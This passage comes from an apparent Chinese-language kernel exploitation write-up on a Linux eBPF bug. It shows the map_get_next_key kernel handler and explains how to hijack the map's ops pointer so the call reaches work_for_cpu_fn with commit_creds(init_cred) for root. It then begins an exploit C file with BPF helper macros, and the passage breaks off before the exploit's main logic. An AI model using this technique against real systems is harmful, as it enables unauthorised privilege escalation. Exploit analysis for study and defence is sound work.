class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"><span class="keyword">if</span> (!(map_get_sys_perms(<span class="built_in">map</span>, f) &amp; FMODE_CAN_READ)) &#123;</span><br><span class="line">err = -EPERM;</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ukey) &#123;</span><br><span class="line">key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">err = PTR_ERR(key);</span><br><span class="line"><span class="keyword">goto</span> err_put;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">next_key = kvmalloc(<span class="built_in">map</span>-&gt;key_size, GFP_USER);</span><br><span class="line"><span class="keyword">if</span> (!next_key)</span><br><span class="line"><span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">err = bpf_map_offload_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rcu_read_lock();</span><br><span class="line">err = <span class="built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="built_in">map</span>, key, next_key);</span><br><span class="line">rcu_read_unlock();</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(unext_key, next_key, <span class="built_in">map</span>-&gt;key_size) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> free_next_key;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">free_next_key:</span><br><span class="line">kvfree(next_key);</span><br><span class="line">free_key:</span><br><span class="line">kvfree(key);</span><br><span class="line">err_put:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里选择这个函数的很明显，在中途直接调用了ops中的<code>map_get_next_key</code>，并且第一个参数为map。那么这个时候我们如果修改ops为我们的<code>bpf-&gt;value</code>即可调用到<code>work_for_cpu_fn</code>，那么在根据<code>work_for_cpu_fn</code>函数内部调整<code>commit_creds</code>和<code>init_cred</code>即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf_common.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _BPF_DEFS_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _BPF_DEFS_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                        \</span></span><br><span class="line"><span class="meta">        .code = CODE,                          \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                        \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                        \</span></span><br><span class="line"><span class="meta">        .off = OFF,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64_RAW(DST, SRC, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                              \</span></span><br><span class="line"><span class="meta">        .code = BPF_LD | BPF_DW | BPF_IMM,           \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                              \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                              \</span></span><br><span class="line"><span class="meta">        .off = 0,                                    \</span></span><br><span class="line"><span class="meta">        .imm = (__u32)(IMM)&#125;),                       \</span></span><br><span class="line"><span class="meta">        ((struct bpf_insn)&#123;                          \</span></span><br><span class="line"><span class="meta">            .code = 0, <span class="comment">/* zero is reserved opcode */</span> \</span></span><br><span class="line"><span class="meta">            .dst_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .src_reg = 0,                            \</span></span><br><span class="line"><span class="meta">            .off = 0,                                \</span></span><br><span class="line"><span class="meta">            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory load, dst_reg = *(uint *) (src_reg + off16) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Memory store, *(uint *) (dst_reg + off16) = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_STX_MEM(SIZE, DST, SRC, OFF)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                             \</span></span><br><span class="line"><span class="meta">        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                             \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                             \</span></span><br><span class="line"><span class="meta">        .off = OFF,                                 \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                       \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                       \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                         \</span></span><br><span class="line"><span class="meta">        .off = OFF,                           \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_JMP32_IMM(OP, DST, IMM, OFF)        \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = OFF,                             \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_IMM(DST, IMM)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                        \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_IMM(DST, IMM)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Short form of mov, dst_reg = src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV64_REG(DST, SRC)              \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                      \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                      \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                      \</span></span><br><span class="line"><span class="meta">        .off = 0,                            \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_MOV32_REG(DST, SRC)            \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                    \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU | BPF_MOV | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                    \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                    \</span></span><br><span class="line"><span class="meta">        .off = 0,                          \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_IMM(OP, DST, IMM)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,                           \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = IMM&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_ALU64_REG(OP, DST, SRC)             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;                         \</span></span><br><span class="line"><span class="meta">        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \</span></span><br><span class="line"><span class="meta">        .dst_reg = DST,                         \</span></span><br><span class="line"><span class="meta">        .src_reg = SRC,                         \</span></span><br><span class="line"><span class="meta">        .off = 0,                               \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Program exit */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_EXIT_INSN()             \</span></span><br><span class="line"><span class="meta">    ((struct bpf_insn)&#123;             \</span></span><br><span class="line"><span class="meta">        .code = BPF_JMP | BPF_EXIT, \</span></span><br><span class="line"><span class="meta">        .dst_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .src_reg = 0,               \</span></span><br><span class="line"><span class="meta">        .off = 0,                   \</span></span><br><span class="line"><span class="meta">        .imm = 0&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_IMM64(DST, IMM) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, 0, IMM)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BPF_LD_MAP_FD(DST, MAP_FD) \</span></span><br><span class="line"><span class="meta">    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// varies from userspace bpf_map_info definition so need to redefine</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    __u32 type;</span><br><span class="line">    __u32 id;</span><br><span class="line">    __u32 key_size;</span><br><span class="line">    __u32 value_size;</span><br><span class="line">    __u32 max_entries;</span><br><span class="line">    __u32 map_flags;</span><br><span class="line">    <span class="keyword">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">    __u32 ifindex;</span><br><span class="line">    __u32 btf_vmlinux_value_type_id;</span><br><span class="line">    __u64 netns_dev;</span><br><span class="line">    __u64 netns_ino;</span><br><span class="line">    __u32 btf_id;</span><br><span class="line">    __u32 btf_key_type_id;</span><br><span class="line">    __u32 btf_value_type_id;</span><br><span class="line">&#125; __attribute__((aligned(<span class="number">8</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, cmd, attrs, <span class="keyword">sizeof</span>(*attrs));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 